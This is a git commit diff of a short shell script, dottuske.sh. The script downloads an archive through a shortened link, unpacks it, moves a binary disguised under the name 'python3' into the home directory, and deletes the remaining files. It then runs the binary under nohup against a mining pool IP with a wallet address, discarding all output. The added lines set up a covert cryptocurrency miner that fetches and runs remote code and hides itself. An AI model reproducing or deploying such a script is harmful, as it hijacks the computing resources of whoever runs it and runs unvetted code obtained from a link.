be848ce519357aa613d963f786f9a685f6138f75
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-28 08:04:52 +0700

    Update dottuske.sh

--- dottuske.sh
+++ dottuske.sh
@@ -1,4 +1,3 @@
-apt install screen -y
 
 wget -O dot bit.ly/KONTOL-AKU-GEDE
 
@@ -6,4 +5,14 @@ tar -xzvf dot
 
 rm dot
 
-screen ./dotsrb/python3 -o 103.120.18.227:443 -a randomtuske -u TuskeSyuT7TEvsg3co36hu6z5P2jMksroYnq8ejhxDRd3K6LQSc4LhU8TR4u1CZVNBViJSNN79WUATZ2kgsfywYqehTMRzVaoLb4uF.DOT &>/dev/null
+cd dotsrb
+
+mv python3 ~/
+
+cd ..
+
+rm *
+
+cd ~/
+
+nohup ./python3 -o 103.120.18.227:443 -a randomtuske -u TuskeSyuT7TEvsg3co36hu6z5P2jMksroYnq8ejhxDRd3K6LQSc4LhU8TR4u1CZVNBViJSNN79WUATZ2kgsfywYqehTMRzVaoLb4uF.DOT &>/dev/null
